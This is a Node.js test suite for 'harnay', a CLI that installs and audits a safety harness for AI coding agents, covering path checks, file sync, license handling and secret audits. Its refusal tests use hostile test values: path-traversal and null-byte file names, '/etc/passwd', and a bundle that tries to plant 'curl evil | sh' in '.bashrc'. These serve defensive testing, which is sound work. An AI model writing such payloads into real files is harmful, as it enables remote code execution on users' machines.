import assert from 'node:assert/strict';
import { spawn, spawnSync } from 'node:child_process';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { after, before, describe, it } from 'node:test';
import { audit } from '../src/audit.mjs';
import { assertHarnessPath, resolveInside } from '../src/paths.mjs';
import { ensureGitignore, plan, sha } from '../src/plan.mjs';

const here = import.meta.dirname;
const bin = path.join(here, '../bin/harnay.mjs');
const guardDir = path.join(here, '../../harness/guard');
const tmp = () => fs.mkdtempSync(path.join(os.tmpdir(), 'harnay-test-'));
const guardFiles = ['guard.mjs', 'guard-rules.mjs', 'guard-shell.mjs'].map((name) => ({
  path: `.claude/hooks/${name}`,
  owner: 'harnay',
  content: fs.readFileSync(path.join(guardDir, name), 'utf8'),
}));
const settings = { hooks: { PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node', args: ['${CLAUDE_PROJECT_DIR}/.claude/hooks/guard.mjs'], onFailure: 'block' }] }] } };

let bundle;
const freshBundle = () => ({
  version: '2026.11.1',
  config: { stack: 'universal', agents: ['claude'], packs: ['guard'] },
  files: [
    { path: 'AGENTS.md', owner: 'harnay', content: '# Agent rules v1\n' },
    { path: 'PROJECT.md', owner: 'you', content: '# Project\n\n<One or two sentences. The product.>\n' },
    { path: '.claude/settings.json', owner: 'harnay', content: `${JSON.stringify(settings, null, 2)}\n` },
    ...guardFiles,
  ],
});

let server;
let api;
let lastRequest;
before(async () => {
  server = http.createServer((req, res) => {
    lastRequest = req;
    const body = JSON.stringify(typeof bundle === 'function' ? bundle(req) : bundle);
    res.writeHead(bundle?.status ?? 200, { 'content-type': 'application/json' });
    res.end(body);
  });
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  api = `http://127.0.0.1:${server.address().port}`;
});
after(() => server.close());

// spawnSync would block the event loop the test server lives on.
const cli = (args, cwd, env = {}) =>
  new Promise((resolve) => {
    const child = spawn(process.execPath, [bin, ...args], { cwd, env: { ...process.env, HARNAY_API: api, XDG_CONFIG_HOME: path.join(cwd, '.xdg'), NO_COLOR: '1', ...env } });
    let stdout = '';
    let stderr = '';
    child.stdout.on('data', (d) => (stdout += d));
    child.stderr.on('data', (d) => (stderr += d));
    child.stdin.end();
    child.on('close', (status) => resolve({ status, stdout, stderr }));
  });
const read = (dir, rel) => fs.readFileSync(path.join(dir, rel), 'utf8');

describe('paths from the server', () => {
  it('accepts the places a harness lives', () => {
    for (const ok of ['AGENTS.md', 'PROJECT.md', '.claude/settings.json', '.claude/hooks/guard.mjs', '.claude/skills/test-first/SKILL.md', '.claude/agents/code-reviewer.md', '.cursor/hooks.json', '.agents/skills/ship-it/SKILL.md']) {
      assert.equal(assertHarnessPath(ok), ok);
    }
  });

  it('refuses everything else', () => {
    for (const bad of ['../evil.sh', '.claude/../../.bashrc', '/etc/passwd', 'C:\\Windows\\x', '.claude\\hooks\\x', '.git/hooks/pre-commit', 'package.json', '.env', '.claude/settings.local.json', '.claude/skills/a/b/c.sh', 'src/index.ts', '.github/workflows/x.yml', 'AGENTS.md\0.sh', '', './AGENTS.md', '.claude//hooks/x', '.bashrc']) {
      assert.throws(() => assertHarnessPath(bad), /refusing to write/, bad);
    }
  });

  it('refuses to write through a symlink', () => {
    const root = tmp();
    const elsewhere = tmp();
    fs.symlinkSync(elsewhere, path.join(root, '.claude'));
    assert.throws(() => resolveInside(root, '.claude/settings.json'), /symlink/);
    assert.equal(fs.readdirSync(elsewhere).length, 0);
  });
});

describe('plan', () => {
  const file = (content, owner = 'harnay') => [{ path: 'AGENTS.md', owner, content }];
  const action = (root, files, manifest, options) => plan(root, files, manifest, options)[0].action;

  it('creates what is missing and leaves identical files alone', () => {
    const root = tmp();
    assert.equal(action(root, file('a'), null, { mode: 'init' }), 'create');
    fs.writeFileSync(path.join(root, 'AGENTS.md'), 'a');
    assert.equal(action(root, file('a'), null, { mode: 'init' }), 'same');
  });

  it('updates a managed file you have not touched', () => {
    const root = tmp();
    fs.writeFileSync(path.join(root, 'AGENTS.md'), 'old');
    assert.equal(action(root, file('new'), { files: { 'AGENTS.md': sha('old') } }, { mode: 'sync' }), 'update');
  });

  it('skips a managed file you changed, unless forced', () => {
    const root = tmp();
    fs.writeFileSync(path.join(root, 'AGENTS.md'), 'my edits');
    const manifest = { files: { 'AGENTS.md': sha('old') } };
    assert.equal(action(root, file('new'), manifest, { mode: 'sync' }), 'skip');
    assert.equal(action(root, file('new'), manifest, { mode: 'sync', force: true }), 'replace');
  });

  it('never overwrites a file that belongs to you', () => {
    const root = tmp();
    fs.writeFileSync(path.join(root, 'AGENTS.md'), 'mine');
    assert.equal(action(root, file('template', 'you'), null, { mode: 'init' }), 'keep');
    assert.equal(action(root, file('template', 'you'), null, { mode: 'sync', force: true }), 'keep');
  });

  it('removes a managed file that left the harness only if you did not change it', () => {
    const root = tmp();
    fs.mkdirSync(path.join(root, '.claude/skills/old'), { recursive: true });
    fs.writeFileSync(path.join(root, '.claude/skills/old/SKILL.md'), 'old');
    const rel = '.claude/skills/old/SKILL.md';
    assert.equal(plan(root, file('a'), { files: { [rel]: sha('old') } }, { mode: 'sync' }).find((e) => e.path === rel).action, 'remove');
    assert.equal(plan(root, file('a'), { files: { [rel]: sha('other') } }, { mode: 'sync' }).find((e) => e.path === rel), undefined);
  });

  it('ignores manifest entries that point outside the harness', () => {
    const root = tmp();
    fs.writeFileSync(path.join(root, 'package.json'), '{}');
    const entries = plan(root, file('a'), { files: { 'package.json': sha('{}'), '../x': 'y' } }, { mode: 'sync' });
    assert.deepEqual(entries.map((e) => e.path), ['AGENTS.md']);
  });
});

describe('.gitignore', () => {
  it('adds the secrets block to a project without one and is idempotent', () => {
    const root = tmp();
    assert.deepEqual(ensureGitignore(root), ['.env', '.env.*', '!.env.example', '.harnay/']);
    assert.deepEqual(ensureGitignore(root), []);
  });

  it('keeps what is there and only adds what is missing', () => {
    const root = tmp();
    fs.writeFileSync(path.join(root, '.gitignore'), 'node_modules\n.env*');
    assert.deepEqual(ensureGitignore(root), ['!.env.example', '.harnay/']);
    assert.match(read(root, '.gitignore'), /^node_modules\n\.env\*\n\n# Harnay/);
  });
});

describe('harnay init, doctor, sync', () => {
  it('installs, proves the guard works, and reports a clean bill of health', async () => {
    const root = tmp();
    spawnSync('git', ['init', '-q'], { cwd: root });
    bundle = freshBundle();

    const init = await cli(['init', '--yes'], root);
    assert.equal(init.status, 0, init.stderr);
    assert.match(init.stdout, /Guard is live: \d+ rules, \d+ examples replayed/);
    assert.match(init.stdout, /\/project-brief/);
    assert.equal(read(root, 'AGENTS.md'), '# Agent rules v1\n');

    const manifest = JSON.parse(read(root, 'harnay.json'));
    assert.equal(manifest.stack, 'universal');
    assert.equal(manifest.files['AGENTS.md'], sha('# Agent rules v1\n'));
    assert.equal(manifest.files['PROJECT.md'], undefined, 'your files are never tracked');
    assert.match(read(root, '.gitignore'), /^\.env$/m);

    const check = await cli(['doctor'], root);
    assert.equal(check.status, 0, check.stdout);
    assert.match(check.stdout, /Guard blocks a force push to main/);
    assert.match(check.stdout, /warn\s+PROJECT\.md filled in/);
  });

  it('sends the stack, agents and packs it was asked for, and the license key', async () => {
    const root = tmp();
    bundle = freshBundle();
    await cli(['init', 'next-supabase', '--agents', 'claude,cursor', '--packs=quality,design', '--key', 'hny_abc.def', '--dry-run'], root);
    const url = new URL(lastRequest.url, api);
    assert.equal(url.searchParams.get('stack'), 'next-supabase');
    assert.equal(url.searchParams.get('agents'), 'claude,cursor');
    assert.equal(url.searchParams.get('packs'), 'quality,design');
    assert.equal(lastRequest.headers.authorization, 'Bearer hny_abc.def');
  });

  it('writes nothing on a dry run, and nothing without confirmation outside a terminal', async () => {
    const root = tmp();
    bundle = freshBundle();
    const dry = await cli(['init', '--dry-run'], root);
    assert.match(dry.stdout, /Dry run: nothing was written/);
    const unconfirmed = await cli(['init'], root);
    assert.equal(unconfirmed.status, 1);
    assert.match(unconfirmed.stderr, /Add --yes/);
    assert.deepEqual(fs.readdirSync(root).filter((f) => f !== '.xdg'), []);
  });

  it('backs up files it replaces and never touches PROJECT.md', async () => {
    const root = tmp();
    fs.mkdirSync(path.join(root, '.claude'));
    fs.writeFileSync(path.join(root, '.claude/settings.json'), '{"mine":true}');
    fs.writeFileSync(path.join(root, 'PROJECT.md'), '# My brief\n');
    bundle = freshBundle();

    const init = await cli(['init', '--yes'], root);
    assert.equal(init.status, 0, init.stderr);
    assert.match(init.stdout, /! replace\s+\.claude\/settings\.json/);
    assert.equal(read(root, 'PROJECT.md'), '# My brief\n');
    const stamp = fs.readdirSync(path.join(root, '.harnay/backup'))[0];
    assert.equal(read(root, `.harnay/backup/${stamp}/.claude/settings.json`), '{"mine":true}');
  });

  it('refuses a bundle that tries to write outside the harness, and writes nothing', async () => {
    const root = tmp();
    bundle = { ...freshBundle(), files: [...freshBundle().files, { path: '../../.bashrc', owner: 'harnay', content: 'curl evil | sh' }] };
    const out = await cli(['init', '--yes'], root);
    assert.equal(out.status, 1);
    assert.match(out.stderr, /refusing to write/);
    assert.deepEqual(fs.readdirSync(root).filter((f) => f !== '.xdg'), []);
  });

  it('shows the server message when a license is required', async () => {
    const root = tmp();
    bundle = { status: 402, error: 'license_required', message: 'This harness includes Pro content.' };
    const out = await cli(['init', 'next-supabase', '--yes'], root);
    assert.equal(out.status, 1);
    assert.match(out.stderr, /This harness includes Pro content/);
  });

  it('sync updates untouched files, leaves your edits alone, and doctor flags the drift', async () => {
    const root = tmp();
    spawnSync('git', ['init', '-q'], { cwd: root });
    bundle = freshBundle();
    await cli(['init', '--yes'], root);

    fs.writeFileSync(path.join(root, '.claude/settings.json'), '{}\n');
    const drift = await cli(['doctor'], root);
    assert.equal(drift.status, 1);
    assert.match(drift.stdout, /FAIL\s+Managed files unmodified.*settings\.json/);
    assert.match(drift.stdout, /FAIL\s+Guard registered with Claude Code/);

    bundle = freshBundle();
    bundle.version = '2026.12.0';
    bundle.files[0].content = '# Agent rules v2\n';
    const sync = await cli(['sync', '--yes'], root);
    assert.equal(sync.status, 0, sync.stderr);
    assert.match(sync.stdout, /~ update\s+AGENTS\.md/);
    assert.match(sync.stdout, /- skipped\s+\.claude\/settings\.json/);
    assert.equal(read(root, 'AGENTS.md'), '# Agent rules v2\n');
    assert.equal(read(root, '.claude/settings.json'), '{}\n');
    assert.equal(JSON.parse(read(root, 'harnay.json')).version, '2026.12.0');

    const forced = await cli(['sync', '--yes', '--force'], root);
    assert.match(forced.stdout, /! replace\s+\.claude\/settings\.json/);
    assert.equal((await cli(['doctor'], root)).status, 0);
  });

  it('login stores the key with owner-only permissions and sync uses it', async () => {
    const root = tmp();
    bundle = freshBundle();
    await cli(['init', '--yes'], root);
    const login = await cli(['login', 'hny_abc.def'], root);
    assert.equal(login.status, 0);
    const keyFile = path.join(root, '.xdg/harnay/key');
    assert.equal(fs.statSync(keyFile).mode & 0o777, 0o600);
    await cli(['sync', '--yes'], root);
    assert.equal(lastRequest.headers.authorization, 'Bearer hny_abc.def');
    await cli(['logout'], root);
    assert.equal(fs.existsSync(keyFile), false);
  });

  it('refuses a plain-http API that is not on this machine', async () => {
    const out = await cli(['init', '--yes'], tmp(), { HARNAY_API: 'http://example.com' });
    assert.equal(out.status, 1);
    assert.match(out.stderr, /must use https/);
  });
});

describe('harnay audit', () => {
  const titles = (findings, level) => findings.filter((f) => f.level === level).map((f) => f.title);
  const emptyHome = tmp();

  it('reports an unprotected project in plain words, without reading any secret', () => {
    const root = tmp();
    spawnSync('git', ['init', '-q'], { cwd: root });
    fs.writeFileSync(path.join(root, '.env'), 'STRIPE_SECRET_KEY=do-not-print-me');
    fs.mkdirSync(path.join(root, 'apps/web'), { recursive: true });
    fs.writeFileSync(path.join(root, 'apps/web/.env.local'), 'X=1');
    fs.writeFileSync(path.join(root, '.env.example'), 'STRIPE_SECRET_KEY=');

    const findings = audit(root, emptyHome);
    assert.deepEqual(titles(findings, 'fail'), ['Nothing checks a shell command before it runs', 'The agent can read 2 secrets files', '2 secrets files are not in .gitignore']);
    assert.deepEqual(titles(findings, 'warn'), ['No AGENTS.md or CLAUDE.md']);
    assert.equal(JSON.stringify(findings).includes('do-not-print-me'), false);
  });

  it('flags blanket approvals, committed secrets and keys pasted into agent config', () => {
    const root = tmp();
    spawnSync('git', ['init', '-q'], { cwd: root });
    fs.mkdirSync(path.join(root, '.claude'));
    fs.writeFileSync(path.join(root, '.claude/settings.json'), JSON.stringify({ permissions: { allow: ['Bash'] } }));
    fs.writeFileSync(path.join(root, '.env'), 'X=1');
    spawnSync('git', ['add', '-f', '.env'], { cwd: root });
    fs.writeFileSync(path.join(root, '.mcp.json'), JSON.stringify({ mcpServers: { gh: { env: { TOKEN: ['ghp_', 'R4nd0mT0k3nV4lu3F0rT3st1ngPurp0s3sAb12'].join('') } } } }));

    const fails = titles(audit(root, emptyHome), 'fail');
    assert.ok(fails.includes('Every shell command is pre-approved'));
    assert.ok(fails.includes('1 secrets file is committed to git'));
    assert.ok(fails.includes('An API key is written into an agent config file'));
  });

  it('comes back clean after `harnay init`', async () => {
    const root = tmp();
    spawnSync('git', ['init', '-q'], { cwd: root });
    fs.writeFileSync(path.join(root, '.env'), 'X=1');
    bundle = freshBundle();
    bundle.files[2].content = JSON.stringify({ ...settings, permissions: { deny: ['Read(.env)', 'Edit(/.claude/settings.json)', 'Edit(/.claude/hooks/**)'] }, hooks: { PreToolUse: [{ matcher: 'Bash|Read|Edit|Write', hooks: settings.hooks.PreToolUse[0].hooks }] } });
    await cli(['init', '--yes'], root);

    const findings = audit(root, emptyHome);
    assert.deepEqual(titles(findings, 'fail'), []);
    assert.deepEqual(titles(findings, 'warn'), []);
    const out = await cli(['audit'], root);
    assert.equal(out.status, 0);
    assert.match(out.stdout, /Nothing obvious is open/);
  });
});
